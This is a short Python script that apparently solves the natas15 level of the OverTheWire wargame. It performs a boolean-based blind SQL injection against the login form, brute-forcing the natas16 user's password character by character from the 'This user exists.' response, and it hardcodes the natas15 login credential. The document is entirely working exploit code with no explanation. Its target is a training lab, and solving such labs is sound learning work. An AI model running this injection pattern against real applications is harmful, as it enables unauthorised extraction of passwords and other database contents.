import requests
from requests.auth import HTTPBasicAuth

try:
	payload = ""
	print("\nStart..\n")
	for pos in range(1,33):
		for ch in range(32,  127):
			resp = requests.post("http://natas15.natas.labs.overthewire.org/index.php", auth=HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"), data={"username": "admin\" OR ASCII(SUBSTR((SELECT password FROM users WHERE username='natas16'),{},1))={}-- -".format(pos, ch)})
			if "This user exists." in resp.text:
				payload += chr(ch)
				print(payload)
				break
		print("Position: {}\n".format(pos))
	print("\nFinished\n")
except:
	exit(0)
